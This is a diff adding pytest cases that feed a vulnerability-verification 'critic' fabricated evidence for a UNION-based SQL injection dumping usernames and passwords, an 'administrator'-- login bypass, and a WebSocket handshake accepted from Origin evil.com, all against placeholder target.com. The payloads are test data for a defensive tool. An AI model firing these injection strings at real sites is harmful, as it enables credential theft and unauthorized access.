@@ -807,5 +807,112 @@ def test_xxe_stockcheck_ssrf_positive(critic, cas):
     assert res["is_verified"], f"Genuine XXE SSRF Failed Verification: {res}"
 
 
+# ─────────────────────────────────────────────────────────────────────────────
+# 14. UNION SQLi, Auth Bypass, & CSWSH Golden Tests
+# ─────────────────────────────────────────────────────────────────────────────
+def test_sqli_union_data_extraction_positive(critic, cas):
+    """Positive: UNION-based SQLi dumping users table data into HTML table must be verified."""
+    union_html = """<!DOCTYPE html>
+<html>
+<head><title>Search Results</title></head>
+<body>
+  <table class="is-table-longdescription">
+    <tr><th>administrator</th><td>s3cr3t_p@ssw0rd_hash</td></tr>
+    <tr><th>carlos</th><td>my_pass_123</td></tr>
+  </table>
+</body>
+</html>"""
+
+    raw = {
+        "is_vulnerable": True,
+        "confidence_score": 0.99,
+        "reasoning": "UNION-Based SQL Injection confirmed on 'https://target.com/filter' via parameter 'category'. Injected query records disclosed in response table: 'administrator'.",
+        "target_url": "https://target.com/filter?category=Gifts%27+UNION+SELECT+username%2C+password+FROM+users--",
+        "evidence_exchanges": [
+            {
+                "request": {
+                    "method": "GET",
+                    "url": "https://target.com/filter?category=Gifts%27+UNION+SELECT+username%2C+password+FROM+users--"
+                },
+                "response": {
+                    "status_code": 200,
+                    "headers": {"content-type": "text/html; charset=utf-8"},
+                    "body_snippet": union_html
+                }
+            }
+        ]
+    }
+    b = cas.store_evidence("target.com", "sqli_vulnerability", raw)
+    res = critic.verify_finding(b)
+    assert res["is_verified"], f"UNION SQLi Failed Verification: {res}"
+
+
+def test_sqli_login_auth_bypass_positive(critic, cas):
+    """Positive: SQL injection bypass on POST /login redirecting to /my-account must be verified."""
+    raw = {
+        "is_vulnerable": True,
+        "confidence_score": 0.99,
+        "reasoning": "CRITICAL SQL Injection Login Bypass confirmed on 'https://target.com/login'. Authenticated administrative access gained using payload 'administrator'--'.",
+        "target_url": "https://target.com/login",
+        "evidence_exchanges": [
+            {
+                "request": {
+                    "method": "POST",
+                    "url": "https://target.com/login",
+                    "headers": {"content-type": "application/x-www-form-urlencoded"},
+                    "body": "username=administrator%27--&password=password"
+                },
+                "response": {
+                    "status_code": 302,
+                    "headers": {
+                        "location": "/my-account",
+                        "set-cookie": "session=authenticated_admin_session_token_xyz"
+                    },
+                    "body_snippet": "Found. Redirecting to /my-account"
+                }
+            }
+        ]
+    }
+    b = cas.store_evidence("target.com", "sqli_vulnerability", raw)
+    res = critic.verify_finding(b)
+    assert res["is_verified"], f"SQLi Login Bypass Failed Verification: {res}"
+
+
+def test_cswsh_origin_bypass_positive(critic, cas):
+    """Positive: Cross-Site WebSocket Hijacking with HTTP 101 on Origin: evil.com must be verified."""
+    raw = {
+        "is_vulnerable": True,
+        "confidence_score": 0.95,
+        "reasoning": "Cross-Site WebSocket Hijacking (CSWSH) confirmed on 'https://target.com/chat'. Handshake accepted arbitrary cross-site Origin 'https://evil.com'.",
+        "target_url": "https://target.com/chat",
+        "evidence_exchanges": [
+            {
+                "request": {
+                    "method": "GET",
+                    "url": "https://target.com/chat",
+                    "headers": {
+                        "Upgrade": "websocket",
+                        "Connection": "Upgrade",
+                        "Origin": "https://evil.com"
+                    }
+                },
+                "response": {
+                    "status_code": 101,
+                    "headers": {
+                        "Upgrade": "websocket",
+                        "Connection": "Upgrade",
+                        "Sec-WebSocket-Accept": "s3pPLMBiTxaQ9kYGzzhZRbK+xOo="
+                    },
+                    "body_snippet": ""
+                }
+            }
+        ]
+    }
+    b = cas.store_evidence("target.com", "cswsh_vulnerability", raw)
+    res = critic.verify_finding(b)
+    assert res["is_verified"], f"CSWSH Failed Verification: {res}"
+
+
+
 
 
